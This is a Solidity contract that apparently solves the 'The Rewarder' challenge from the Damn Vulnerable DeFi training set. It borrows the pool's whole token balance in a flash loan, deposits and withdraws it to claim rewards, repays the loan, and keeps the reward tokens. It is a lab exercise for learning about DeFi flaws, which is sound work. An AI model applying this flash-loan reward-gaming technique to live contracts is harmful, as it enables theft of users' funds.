// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract RewardExploit {
    FlashLoanerPool pool;
    DamnValuableToken token;
    TheRewarderPool rewardPool;
    RewardToken rewardToken;

    function attack(
        address _pool,
        address _token,
        address _rewardPool,
        address _rewardToken
    ) public {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        rewardToken = RewardToken(_rewardToken);
        pool.flashLoan(token.balanceOf(_pool));
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public payable {
        token.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        token.transfer(address(pool), amount);
    }
}
